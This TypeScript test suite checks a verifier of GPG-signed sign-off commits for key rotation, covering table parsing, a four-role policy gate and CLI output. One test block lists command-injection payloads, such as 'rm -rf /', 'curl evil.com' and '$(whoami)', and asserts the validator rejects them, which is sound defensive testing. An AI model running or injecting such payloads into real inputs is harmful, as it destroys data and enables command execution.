/**
 * D2.9 + D3.0 hardening — rotation sign-off verifier regression gate.
 *
 * Why this exists
 * ───────────────
 * `scripts/verify-rotation-signoff.ts` parses the §6 table in
 * `docs/security/keys-rotation.md`, runs `git verify-commit <sha>` for
 * every non-empty Signed-Commit SHA, and extracts a derived `signed_at`
 * from `git log -1 --format=%aI <sha>`. This vitest suite is the CI-bound
 * regression gate that proves the verifier behaves correctly across the
 * matrix of inputs the policy must hold up against.
 *
 * Matrix covered (D2.9 — POLICY_MIN_VERIFIED_ROWS = 4):
 *   • Parsing — bold-marked rows correctly map to SignoffRow fields.
 *   • Defense-in-depth — CRLF / command-injection / shell-metacharacter
 *     payloads are rejected before they reach git at all.
 *   • D2.9 POLICY evaluator (pure function):
 *       — POLICY_MIN_VERIFIED_ROWS === 4
 *       — empty rows                  → RED / exit 1 (NOT bound)
 *       — all-pending                  → RED / exit 1 (NOT bound)
 *       — 1 verified + rest pending   → RED / exit 1 (still under min)
 *       — 2 verified + rest pending   → RED / exit 1 (still under min)
 *       — 3 verified + rest pending   → RED / exit 1 (just-below-boundary)
 *       — 4 verified + rest pending   → GREEN / exit 0 (D2.9 boundary)
 *       — 2 verified + 1 failed       → RED / exit 1, BOTH clauses surface
 *       — 0 verified + invalid SHA    → RED / exit 1, BOTH clauses surface
 *       — 4/4 verified (all-bound)    → GREEN / exit 0
 *   • Real-repo empty state — under D2.7/D2.8/D2.9 the empty table is RED exit 1.
 *   • Synthetic unverified-SHA — `git rev-parse HEAD` of this unsigned
 *     repo produces an unverified SHA that drives the gate RED.
 *   • End-to-end CLI subprocess — `npx tsx scripts/verify-...` exits
 *     1 + RED on the live empty-table doc.
 *
 * D3.0 additions — `reasons: readonly string[]` public API:
 *   • OK case reasons[] is empty array (no actionable defects).
 *   • RED single-clause reasons[] has 1 element (the bound clause).
 *   • RED dual-clause reasons[] carries BOTH clauses as separate elements
 *     (NOT joined — structured dashboards / jq iterate the array directly).
 *   • exit 2 (file-missing / §6-missing / 0-row) reasons[] has the
 *     canonical error or policy-bound reason as a single element.
 *   • reasons[] is `Object.freeze`d on EVERY return path so a consumer
 *     that mutates the array fails fast (TypeError) instead of silently
 *     mutating shared state.
 *   • Backwards-compat: `result.report` still exists with the same
 *     AND-stacked human-readable string for consumers that haven't migrated.
 *
 * D3.0 additions — CLI surface:
 *   • `--json`  → compact `{status, exitCode, reasons}` JSON payload on
 *     stdout; human report still emits on stderr unless `--quiet` also passed.
 *   • `--quiet` → suppress the multi-line human report on stderr; print
 *     only a one-line status summary (`Result: RED ❌ — verified=N …`).
 *   • `--json --quiet` → orthogonal: JSON on stdout + summary line on
 *     stderr only (the typical `jq` pipeline shape).
 *
 * mkRow contract: `error: string | null` (REQUIRED, no `?`). The compile-time
 * guarantee comes from the bare signature on `mkRow`; vitest confirms the
 * runtime propagation behaviour.
 */

import { spawnSync } from 'node:child_process';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { describe, expect, it } from 'vitest';

/** On Windows, npx is a .cmd batch file — Node.js spawnSync won't find it without .cmd suffix. */
function npxSpawn(args: string[], opts?: { timeout?: number }) {
  const npxCmd = process.platform === 'win32' ? 'npx.cmd' : 'npx';
  const cliPath = path.join(REPO_ROOT, 'scripts', 'verify-rotation-signoff.ts');
  return spawnSync(npxCmd, ['tsx', cliPath, ...args], {
    cwd: REPO_ROOT,
    encoding: 'utf-8',
    timeout: opts?.timeout ?? 60_000,
  });
}

import {
  countColumns,
  evaluateSignoff,
  extractSection,
  parseSignoffTable,
  POLICY_MIN_VERIFIED_ROWS,
  runVerifier,
  SHA_RE,
  SignoffRow,
  verifySha,
} from '../../src/security/rotationSignoffVerifier';

const REPO_ROOT = path.resolve(__dirname, '../../../..');
const REAL_DOC = path.join(REPO_ROOT, 'docs/security/keys-rotation.md');

/**
 * Build a `SignoffRow` with the fields that matter for the policy evaluator.
 *
 * `error` is `string | null` (NO optional fallback) — every caller must
 * pass `error: null` for a success-path row or `error: '<reason>'` for a
 * failure-path row. No silent fallthrough — the failure path is loud.
 */
function mkRow(opts: {
  role: string;
  sha?: string;
  verified?: boolean;
  signedAt?: string | null;
  error: string | null;
}): SignoffRow {
  return {
    role: opts.role,
    name: '',
    handle: '',
    fingerprint: '',
    sha: opts.sha ?? '',
    signedAt: opts.signedAt ?? null,
    signedBy: null,
    verified: opts.verified ?? false,
    error: opts.error,
  };
}

describe('D2.6 hardening — sign-off table parser', () => {
  it('extracts §6 Sign-off section from the live repo doc', () => {
    expect(fs.existsSync(REAL_DOC)).toBe(true);
    const text = fs.readFileSync(REAL_DOC, 'utf-8');
    const section = extractSection(text, '§6 — Sign-off');
    expect(section).not.toBeNull();
    // Section must contain the table header + at least one data row.
    expect(section).toContain('| Role');
    expect(section).toContain('| **CISO**');
  });

  it('returns null when the requested section is missing', () => {
    const text = '# other\n\n## §9 — MIA\n';
    expect(extractSection(text, '§6 — Sign-off')).toBeNull();
  });

  it('parses a 5-column data row carrying each role + cell triplet', () => {
    const synthetic = [
      '## §6 — Sign-off',
      '',
      '| Role | Name | GitHub handle | GPG fingerprint (16-char short) | Signed-Commit SHA |',
      '|------|------|---------------|---------------------------------|-------------------|',
      '| **CISO**            | Alice Smith | @alice | 7E5C0F8B4D1A9C23 | abc1234def567890 |',
      '| **Engineering Lead**| Bob Loblaw  | @bob   | 4A1B2C3D4E5F6A7B |                  |',
      '',
      '## §7 — Next',
    ].join('\n');
    const section = extractSection(synthetic, '§6 — Sign-off');
    expect(section).not.toBeNull();
    const rows = parseSignoffTable(section!);
    expect(rows.length).toBe(2);
    expect(rows[0]!.role).toBe('CISO');
    expect(rows[0]!.name).toBe('Alice Smith');
    expect(rows[0]!.handle).toBe('@alice');
    expect(rows[0]!.fingerprint).toBe('7E5C0F8B4D1A9C23');
    expect(rows[0]!.sha).toBe('abc1234def567890');
    expect(rows[1]!.role).toBe('Engineering Lead');
    expect(rows[1]!.sha).toBe('');
  });

  it('skips header + separator + non-bold prose rows', () => {
    const synthetic = [
      '| Role | Name | GitHub handle | GPG fingerprint (16-char short) | Signed-Commit SHA |',
      '|------|------|---------------|---------------------------------|-------------------|',
      '| this is a prose line, not bold |',
      '| **CISO** | | | | |',
    ].join('\n');
    const rows = parseSignoffTable(synthetic);
    expect(rows.length).toBe(1);
    expect(rows[0]!.role).toBe('CISO');
  });

  it('countColumns correctly reflects the 5-column shape', () => {
    expect(countColumns('| a | b | c | d | e |')).toBe(5);
    expect(countColumns('| a | b | c | d |')).toBe(4);
    expect(countColumns('| **CISO** | | | | |')).toBe(5);
  });
});

describe('D2.6 hardening — SHA injection defense-in-depth', () => {
  // The whole point: even if a malicious doc edit placed shell-injection
  // payloads into the table, SHA_RE rejects them BEFORE they reach git.
  // Without this guard, spawnSync's arg-array mode is still safe (no shell),
  // but defense-in-depth keeps the policy explicit.
  const MALICIOUS_INPUTS = [
    'abc1234; rm -rf /',
    'abc1234 && curl evil.com',
    'abc1234\nrm -rf /', // LF injection
    'abc1234\r\nGIT_PUSH_FORCE=1', // CRLF injection
    '$(whoami)',
    '`whoami`',
    'abc 1234', // internal whitespace
    'xyz-not-hex!',
    'aaaaaaaaaaaaZZZZZ', // non-hex chars
  ] as const;

  for (const payload of MALICIOUS_INPUTS) {
    it(`rejects malicious SHA: ${JSON.stringify(payload)}`, () => {
      expect(SHA_RE.test(payload)).toBe(false);
      const result = verifySha(payload);
      expect(result.verified).toBe(false);
      expect(result.error).toMatch(/invalid SHA format/);
    });
  }

  it('accepts canonical 7-char abbreviated SHA', () => {
    expect(SHA_RE.test('abc1234')).toBe(true);
  });

  it('accepts canonical 40-char SHA-1', () => {
    expect(SHA_RE.test('0123456789abcdef0123456789abcdef01234567')).toBe(true);
  });

  it('accepts canonical 64-char SHA-256', () => {
    expect(
      SHA_RE.test('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'),
    ).toBe(true);
  });
});

describe('D2.9 hardening — policy evaluator (pure function, POLICY_MIN_VERIFIED_ROWS = 4)', () => {
  it('POLICY_MIN_VERIFIED_ROWS equals 4 (D2.9 full 4-role bump from D2.8 = 2)', () => {
    expect(POLICY_MIN_VERIFIED_ROWS).toBe(4);
  });

  it('RED on empty input — no role rows at all = policy not bound', () => {
    const r = evaluateSignoff([]);
    expect(r.ok).toBe(false);
    expect(r.exitCode).toBe(1);
    expect(r.report).toMatch(/RED: policy NOT bound/);
    expect(r.report).toMatch(/at least 4 role\(s\) must hold a GPG-verified SHA/);
  });

  it('RED when every row is pending (all empty SHA cells)', () => {
    const rows = [
      mkRow({ role: 'CISO', error: null }),
      mkRow({ role: 'Head of Security', error: null }),
      mkRow({ role: 'Engineering Lead', error: null }),
      mkRow({ role: 'Compliance Lead', error: null }),
    ];
    const r = evaluateSignoff(rows);
    expect(r.ok).toBe(false);
    expect(r.exitCode).toBe(1);
    expect(r.report).toMatch(/RED: policy NOT bound/);
    expect(r.report).toMatch(/at least 4 role\(s\) must hold a GPG-verified SHA/);
  });

  it('RED when only 1 row is verified (under D2.9 strict gate — still well under min=4)', () => {
    const rows = [
      mkRow({
        role: 'CISO',
        sha: 'abc1234def567890',
        verified: true,
        signedAt: '2026-06-21T00:00:00+00:00',
        error: null,
      }),
      mkRow({ role: 'Head of Security', error: null }),
      mkRow({ role: 'Engineering Lead', error: null }),
      mkRow({ role: 'Compliance Lead', error: null }),
    ];
    const r = evaluateSignoff(rows);
    expect(r.ok).toBe(false);
    expect(r.exitCode).toBe(1);
    expect(r.report).toMatch(/RED: policy NOT bound/);
    expect(r.report).toMatch(/at least 4 role\(s\) must hold a GPG-verified SHA/);
  });

  it('RED when 2 rows are verified (still under D2.9 min = 4)', () => {
    const rows = [
      mkRow({ role: 'CISO', sha: 'abc1234def567890', verified: true, error: null }),
      mkRow({ role: 'Head of Security', sha: 'deadbeef012345678', verified: true, error: null }),
      mkRow({ role: 'Engineering Lead', error: null }),
      mkRow({ role: 'Compliance Lead', error: null }),
    ];
    const r = evaluateSignoff(rows);
    expect(r.ok).toBe(false);
    expect(r.exitCode).toBe(1);
    expect(r.report).toMatch(/RED: policy NOT bound/);
    expect(r.report).toMatch(/at least 4 role\(s\) must hold a GPG-verified SHA/);
  });

  it('RED when exactly 3 rows are verified — just below the D2.9 threshold', () => {
    const rows = [
      mkRow({ role: 'CISO', sha: 'abc1234def567890', verified: true, error: null }),
      mkRow({ role: 'Head of Security', sha: 'deadbeef012345678', verified: true, error: null }),
      mkRow({ role: 'Engineering Lead', sha: 'facefeedfacefeedf', verified: true, error: null }),
      mkRow({ role: 'Compliance Lead', error: null }),
    ];
    const r = evaluateSignoff(rows);
    expect(r.ok).toBe(false);
    expect(r.exitCode).toBe(1);
    expect(r.report).toMatch(/RED: policy NOT bound/);
    expect(r.report).toMatch(/at least 4 role\(s\) must hold a GPG-verified SHA/);
    expect(r.report).not.toMatch(/RED:.*AND/);
  });

  it('GREEN at boundary: exactly 4 rows verified and the rest pending (D2.9 boundary case)', () => {
    const rows = [
      mkRow({ role: 'CISO', sha: 'abc1234def567890', verified: true, error: null }),
      mkRow({ role: 'Head of Security', sha: 'deadbeef012345678', verified: true, error: null }),
      mkRow({ role: 'Engineering Lead', sha: 'facefeedfacefeedf', verified: true, error: null }),
      mkRow({ role: 'Compliance Lead', sha: 'cafebabecafebabe00', verified: true, error: null }),
    ];
    const r = evaluateSignoff(rows);
    expect(r.ok).toBe(true);
    expect(r.exitCode).toBe(0);
    expect(r.report).toMatch(/OK: policy bound/);
    expect(r.report).toMatch(/verified=4 \(min=4\)/);
  });

  it('RED when 2 rows are verified and a third FAILED row creeps in — both clauses surface', () => {
    const rows = [
      mkRow({ role: 'CISO', sha: 'abc1234def567890', verified: true, error: null }),
      mkRow({ role: 'Head of Security', sha: 'deadbeef012345678', verified: true, error: null }),
      mkRow({ role: 'Engineering Lead', sha: 'aabbccddee0011223344', verified: false, error: 'unverified' }),
      mkRow({ role: 'Compliance Lead', error: null }),
    ];
    const r = evaluateSignoff(rows);
    expect(r.ok).toBe(false);
    expect(r.exitCode).toBe(1);
    expect(r.report).toMatch(/RED: policy NOT bound.*AND.*1 unverified SHA/);
    expect(r.report).toMatch(/at least 4 role\(s\) must hold a GPG-verified SHA/);
    expect(r.report).toMatch(/1 unverified SHA\(s\) need to be fixed/);
  });

  it('RED when zero rows are verified (one invalid SHA + rest pending) — both reasons surface', () => {
    const rows = [
      mkRow({
        role: 'CISO',
        sha: 'abc1234',
        verified: false,
        error: 'invalid SHA format',
      }),
      mkRow({ role: 'Head of Security', error: null }),
      mkRow({ role: 'Engineering Lead', error: null }),
      mkRow({ role: 'Compliance Lead', error: null }),
    ];
    const r = evaluateSignoff(rows);
    expect(r.ok).toBe(false);
    expect(r.exitCode).toBe(1);
    expect(r.report).toMatch(/RED: policy NOT bound/);
    expect(r.report).toMatch(/at least 4 role\(s\) must hold a GPG-verified SHA/);
    expect(r.report).toMatch(/1 unverified SHA\(s\) need to be fixed/);
    expect(r.report).toMatch(/RED: policy NOT bound.*AND.*1 unverified SHA/);
  });

  it('GREEN when ALL rows are verified (4/4 — bound at exact min)', () => {
    const rows = [
      mkRow({ role: 'CISO', sha: 'abc1234def567890', verified: true, signedAt: '2026-06-21T00:00:00+00:00', error: null }),
      mkRow({ role: 'Head of Security', sha: 'deadbeef012345678', verified: true, signedAt: '2026-06-21T00:00:00+00:00', error: null }),
      mkRow({ role: 'Engineering Lead', sha: 'facefeedfacefeedf', verified: true, signedAt: '2026-06-21T00:00:00+00:00', error: null }),
      mkRow({ role: 'Compliance Lead', sha: 'cafebabecafebabe00', verified: true, signedAt: '2026-06-21T00:00:00+00:00', error: null }),
    ];
    const r = evaluateSignoff(rows);
    expect(r.ok).toBe(true);
    expect(r.exitCode).toBe(0);
    expect(r.report).toMatch(/OK: policy bound/);
  });

  it('mkRow propagates error-string-or-null faithfully: no silent fallback to null', () => {
    const successRow = mkRow({ role: 'CISO', verified: true, error: null });
    const failureRow = mkRow({ role: 'CISO', verified: false, error: 'unverified' });
    expect(successRow.error).toBeNull();
    expect(failureRow.error).toBe('unverified');
  });
});

// ---------------------------------------------------------------------------
// D3.0 hardening — public reason-codes API (reasons[] surface)
// ---------------------------------------------------------------------------

describe('D3.0 hardening — public reason-codes API (reasons: readonly string[])', () => {
  it('OK case: reasons[] is empty array (semantic "no actionable defects")', () => {
    const rows = [
      mkRow({ role: 'CISO', sha: 'a1', verified: true, error: null }),
      mkRow({ role: 'Head of Security', sha: 'b2', verified: true, error: null }),
      mkRow({ role: 'Engineering Lead', sha: 'c3', verified: true, error: null }),
      mkRow({ role: 'Compliance Lead', sha: 'd4', verified: true, error: null }),
    ];
    const r = evaluateSignoff(rows);
    expect(r.ok).toBe(true);
    expect(r.reasons).toEqual([]);
    // Type-level: reasons is readonly string[]
    const _check: readonly string[] = r.reasons;
    expect(_check).toBe(r.reasons);
  });

  it('RED single-clause (verified=0, failed=0): reasons[] is a 1-element array with the policy-bound clause', () => {
    const rows = [
      mkRow({ role: 'CISO', error: null }),
      mkRow({ role: 'Head of Security', error: null }),
      mkRow({ role: 'Engineering Lead', error: null }),
      mkRow({ role: 'Compliance Lead', error: null }),
    ];
    const r = evaluateSignoff(rows);
    expect(r.ok).toBe(false);
    expect(r.reasons.length).toBe(1);
    expect(r.reasons[0]).toMatch(/policy NOT bound/);
    expect(r.reasons[0]).toMatch(/at least 4 role\(s\) must hold a GPG-verified SHA/);
  });

  it('RED dual-clause: reasons[] carries BOTH clauses as separate (NOT joined) elements', () => {
    const rows = [
      mkRow({ role: 'CISO', sha: 'abc1234', verified: false, error: 'invalid SHA' }),
      mkRow({ role: 'Head of Security', error: null }),
      mkRow({ role: 'Engineering Lead', error: null }),
      mkRow({ role: 'Compliance Lead', error: null }),
    ];
    const r = evaluateSignoff(rows);
    expect(r.ok).toBe(false);
    expect(r.reasons.length).toBe(2);
    expect(r.reasons[0]).toMatch(/policy NOT bound/);
    expect(r.reasons[1]).toMatch(/1 unverified SHA\(s\) need to be fixed/);
    // Critically: the two clauses must be SEPARATE elements (not joined into one).
    expect(r.reasons.join(' AND ')).toEqual(r.report.match(/RED: (.*?)\./)![1]!.replace(/ AND /, ' AND '));
    expect(r.reasons[0]).not.toContain(' unverified SHA');
    expect(r.reasons[1]).not.toContain('policy NOT bound');
  });

  it('exit 2 (file-missing): reasons[] is single-element error caption', () => {
    const missingPath = path.join(REPO_ROOT, 'this/path/does/not/exist.md');
    const r = runVerifier(missingPath);
    expect(r.exitCode).toBe(2);
    expect(r.reasons.length).toBe(1);
    expect(r.reasons[0]).toMatch(/^ERROR: doc not found at /);
    expect(r.reasons[0]).toContain(path.join('this', 'path', 'does', 'not', 'exist.md'));
  });

  it('exit 2 (§6 missing): reasons[] is single-element error caption', () => {
    const tmp = path.join(REPO_ROOT, '.commander', 'd30-test-no-section.md');
    fs.mkdirSync(path.dirname(tmp), { recursive: true });
    try {
      fs.writeFileSync(tmp, '# nothing here\n## §1 — nope\n## §2 — nada\n', 'utf-8');
      const r = runVerifier(tmp);
      expect(r.exitCode).toBe(2);
      expect(r.reasons.length).toBe(1);
      expect(r.reasons[0]).toMatch(/ERROR: §6 Sign-off section not found in /);
    } finally {
      try { fs.unlinkSync(tmp); } catch { /* best-effort cleanup */ }
    }
  });

  it('exit 1 (0-row parsed table): reasons[] is the canonical policy-bound reason (single clause)', () => {
    const tmp = path.join(REPO_ROOT, '.commander', 'd30-test-empty-table.md');
    fs.mkdirSync(path.dirname(tmp), { recursive: true });
    try {
      // §6 heading is present but no data rows parsed.
      fs.writeFileSync(tmp, '## §6 — Sign-off\n\n## §7 — Next\n', 'utf-8');
      const r = runVerifier(tmp);
      expect(r.exitCode).toBe(1);
      expect(r.reasons.length).toBe(1);
      expect(r.reasons[0]).toMatch(/policy NOT bound/);
      expect(r.reasons[0]).toMatch(/at least 4 role\(s\)/);
    } finally {
      try { fs.unlinkSync(tmp); } catch { /* best-effort cleanup */ }
    }
  });

  it('Backwards-compat: result.report still contains the AND-stacked human-readable RED string', () => {
    // Pre-D3.0 consumers regex-parse `r.report` for the AND-stacked RED
    // prose. This must continue to work after D3.0 (additive change only).
    const rows = [
      mkRow({ role: 'CISO', sha: 'abc1234', verified: false, error: 'invalid SHA' }),
      mkRow({ role: 'Head of Security', error: null }),
      mkRow({ role: 'Engineering Lead', error: null }),
      mkRow({ role: 'Compliance Lead', error: null }),
    ];
    const r = evaluateSignoff(rows);
    expect(r.report).toMatch(/RED: policy NOT bound/);
    expect(r.report).toMatch(/ AND /);
    expect(r.report).toMatch(/1 unverified SHA\(s\) need to be fixed/);
  });

  it('Immutability: reasons[] is uniformly Object.freeze()d — push throws TypeError on every return path', () => {
    // The reviewer caught an inconsistency where the OK branch returned an
    // unfrozen [] while RED branches returned frozen arrays. The fix is to
    // freeze unconditionally. This test pins that uniform invariant.
    const redRows = [
      mkRow({ role: 'CISO', error: null }),
      mkRow({ role: 'Head of Security', error: null }),
      mkRow({ role: 'Engineering Lead', error: null }),
      mkRow({ role: 'Compliance Lead', error: null }),
    ];
    const greenRows = [
      mkRow({ role: 'CISO', sha: 'a1', verified: true, error: null }),
      mkRow({ role: 'Head of Security', sha: 'b2', verified: true, error: null }),
      mkRow({ role: 'Engineering Lead', sha: 'c3', verified: true, error: null }),
      mkRow({ role: 'Compliance Lead', sha: 'd4', verified: true, error: null }),
    ];
    // RED path
    const redR = evaluateSignoff(redRows);
    expect(() => { (redR.reasons as string[]).push('injected'); }).toThrow(TypeError);
    // OK path — the previously-unfrozen [] case is the critical regression.
    const greenR = evaluateSignoff(greenRows);
    expect(() => { (greenR.reasons as string[]).push('injected'); }).toThrow(TypeError);
  });
});

describe('D2.9 hardening — verifier policy contracts (integration)', () => {
  it('RED on the live repo doc — empty table = policy NOT bound (D2.9 requires ≥4)', () => {
    const result = runVerifier(REAL_DOC);
    expect(result.ok).toBe(false);
    expect(result.exitCode).toBe(1);
    expect(result.report).toMatch(/RED: policy NOT bound/);
    expect(result.report).toMatch(/at least 4 role\(s\) must hold a GPG-verified SHA/);
    // Every row in the live §6 table should currently have an empty SHA cell.
    for (const row of result.rows) {
      expect(row.sha).toBe('');
      expect(row.verified).toBe(false);
    }
  });

  it('RED on synthetic doc with an unverified SHA (HEAD of unsigned repo)', () => {
    const headSha = spawnSync('git', ['rev-parse', 'HEAD'], {
      cwd: REPO_ROOT,
      encoding: 'utf-8',
    }).stdout.trim();
    const syntheticDoc = makeSyntheticDocWithShas({
      CISO: headSha,
    });
    const tmp = path.join(REPO_ROOT, '.commander', 'd29-test-malformed.md');
    fs.mkdirSync(path.dirname(tmp), { recursive: true });
    try {
      fs.writeFileSync(tmp, syntheticDoc, 'utf-8');
      const result = runVerifier(tmp);
      expect(result.ok).toBe(false);
      expect(result.exitCode).toBe(1);
      expect(result.report).toMatch(/RED: policy NOT bound/);
      expect(result.report).toMatch(/at least 4 role\(s\) must hold/);
      expect(result.report).toMatch(/1 unverified SHA\(s\) need to be fixed/);
      expect(result.report).toMatch(/RED: policy NOT bound.*AND.*1 unverified SHA/);
      const cisoRow = result.rows.find((r) => r.role === 'CISO');
      expect(cisoRow).toBeDefined();
      expect(cisoRow!.verified).toBe(false);
      expect(cisoRow!.error).not.toBeNull();
    } finally {
      try { fs.unlinkSync(tmp); } catch { /* best-effort cleanup */ }
    }
  });

  it('exitCode=2 when the doc does not exist', () => {
    const result = runVerifier(path.join(REPO_ROOT, 'totally-not-here.md'));
    expect(result.exitCode).toBe(2);
    expect(result.ok).toBe(false);
  });

  it('exitCode=2 when the §6 section is missing', () => {
    const tmp = path.join(REPO_ROOT, '.commander', 'd29-test-no-section.md');
    fs.mkdirSync(path.dirname(tmp), { recursive: true });
    try {
      fs.writeFileSync(tmp, '# nothing here\n## §1 — nope\n## §2 — nada\n', 'utf-8');
      const result = runVerifier(tmp);
      expect(result.exitCode).toBe(2);
      expect(result.ok).toBe(false);
    } finally {
      try { fs.unlinkSync(tmp); } catch { /* best-effort cleanup */ }
    }
  });

  it('CLI subprocess exit policy matches the library contract (D2.9 = RED on empty table)', async () => {
    const r = npxSpawn([], { timeout: 60_000 });
    expect(r.status).toBe(1);
    expect(r.stderr ?? '').toMatch(/at least 4 role\(s\) must hold a GPG-verified SHA/);
    expect(r.stderr ?? '').toMatch(/Result: RED/);
  }, 60_000);

  // ----- D3.0: CLI flag surface tests -----

  it('CLI --json emits parsable JSON on stdout with reasons[] populated; human report still on stderr', () => {
    const r = npxSpawn(['--json'], { timeout: 30_000 });
    expect(r.status).toBe(1);
    // stdout contains the JSON payload (one or more lines).
    const stdoutLines = (r.stdout ?? '').split('\n').filter(Boolean);
    const jsonLine = stdoutLines.find((l) => l.trim().startsWith('{'));
    expect(jsonLine).toBeDefined();
    const parsed = JSON.parse(jsonLine!) as { status: string; exitCode: number; reasons: string[] };
    expect(parsed.status).toBe('RED');
    expect(parsed.exitCode).toBe(1);
    expect(Array.isArray(parsed.reasons)).toBe(true);
    expect(parsed.reasons.length).toBeGreaterThan(0);
    expect(parsed.reasons[0]).toMatch(/policy NOT bound/);
    // The human report continues to print on stderr unless --quiet is also passed.
    expect(r.stderr ?? '').toMatch(/at least 4 role\(s\)/);
    expect(r.stderr ?? '').toMatch(/Result: RED/);
  }, 60_000);

  it('CLI --quiet suppresses multi-line human report on stderr; stdout empty', () => {
    const r = npxSpawn(['--quiet'], { timeout: 30_000 });
    expect(r.status).toBe(1);
    // stdout is empty (no --json to put a payload there).
    expect(r.stdout ?? '').toBe('');
    // stderr should be ONLY the one-line summary (no per-row diagnostics).
    const stderrLines = (r.stderr ?? '').split('\n').filter(Boolean);
    expect(stderrLines.length).toBe(1);
    expect(stderrLines[0]).toMatch(/^Result: RED ❌ — verified=/);
    expect(stderrLines[0]).toMatch(/verified=0 \(min=4\)/);
  }, 60_000);

  it('CLI --json --quiet: JSON on stdout + summary line ONLY on stderr (orthogonal)', () => {
    const r = npxSpawn(['--json', '--quiet'], { timeout: 30_000 });
    expect(r.status).toBe(1);
    // stdout = JSON payload (one line).
    const stdoutLines = (r.stdout ?? '').split('\n').filter(Boolean);
    const jsonLine = stdoutLines.find((l) => l.trim().startsWith('{'));
    expect(jsonLine).toBeDefined();
    const parsed = JSON.parse(jsonLine!) as { status: string; exitCode: number; reasons: string[] };
    expect(parsed.status).toBe('RED');
    expect(parsed.exitCode).toBe(1);
    expect(parsed.reasons.length).toBeGreaterThan(0);
    // stderr = summary line only (no report body, no per-row diagnostics).
    const stderrLines = (r.stderr ?? '').split('\n').filter(Boolean);
    expect(stderrLines.length).toBe(1);
    expect(stderrLines[0]).toMatch(/^Result: RED ❌/);
  }, 60_000);

  it('CLI --doc=<bad-path> --json emits parse-failure JSON with reasons[0] = "ERROR: doc not found"', () => {
    const badDocPath = path.join(os.tmpdir(), 'd30-no-such-file.md');
    const r = npxSpawn([`--doc=${badDocPath}`, '--json'], { timeout: 60_000 });
    expect(r.status).toBe(2);
    const stdoutLines = (r.stdout ?? '').split('\n').filter(Boolean);
    const jsonLine = stdoutLines.find((l) => l.trim().startsWith('{'));
    expect(jsonLine).toBeDefined();
    const parsed = JSON.parse(jsonLine!) as { status: string; exitCode: number; reasons: string[] };
    expect(parsed.status).toBe('RED');
    expect(parsed.exitCode).toBe(2);
    expect(parsed.reasons[0]).toMatch(/^ERROR: doc not found at /);
  }, 60_000);
});

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/**
 * Build a synthetic markdown doc whose §6 table carries supplied SHAs for
 * some roles and empty SHAs for the rest. Used by integration tests that
 * need a real git-verify path on the resulting doc.
 */
function makeSyntheticDocWithShas(shas: Partial<Record<'CISO' | 'Head of Security' | 'Engineering Lead' | 'Compliance Lead', string>>): string {
  const rows: string[] = [
    '| Role                | Name | GitHub handle | GPG fingerprint (16-char short) | Signed-Commit SHA        |',
    '|---------------------|------|---------------|---------------------------------|--------------------------|',
  ];
  const ROLES = ['CISO', 'Head of Security', 'Engineering Lead', 'Compliance Lead'] as const;
  for (const role of ROLES) {
    const sha = shas[role] ?? '';
    rows.push(`| **${role}**|      |               |                                 | ${sha.padEnd(24, ' ')} |`);
  }
  return [
    '# synthetic (test only)',
    '',
    '## §6 — Sign-off',
    '',
    rows.join('\n'),
    '',
    '## §7 — irrelevant',
  ].join('\n');
}
